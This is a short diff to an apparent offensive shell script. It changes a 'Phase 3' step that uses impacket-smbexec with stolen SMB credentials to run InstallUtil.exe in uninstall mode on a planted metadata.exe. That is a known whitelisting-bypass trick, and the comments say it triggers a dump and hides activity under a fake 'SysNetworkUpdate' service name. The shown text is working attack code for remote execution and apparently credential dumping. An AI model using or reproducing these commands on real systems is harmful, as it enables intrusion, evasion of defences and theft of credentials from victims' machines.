@@ -50,7 +50,7 @@ EOT
 echo "[*] Phase 3: Triggering dump via InstallUtil (Uninstall Mode)..."
 # Using smbexec to run the command silently in the background
 # Note: /U flag tells InstallUtil to call Uninstall() instead of Install()
-impacket-smbexec "$SMB_USER":"$SMB_PASS"@$TARGET_IP -service-name "SysNetworkUpdate" cmd.exe "/c" "cd C:\\Windows\\Tasks && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U metadata.exe"
+impacket-smbexec "$SMB_USER":"$SMB_PASS"@$TARGET_IP -c "cd C:\\Windows\\Tasks && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U metadata.exe 2>&1"
 
 # Give the dump 5 seconds to complete and scramble
 sleep 5
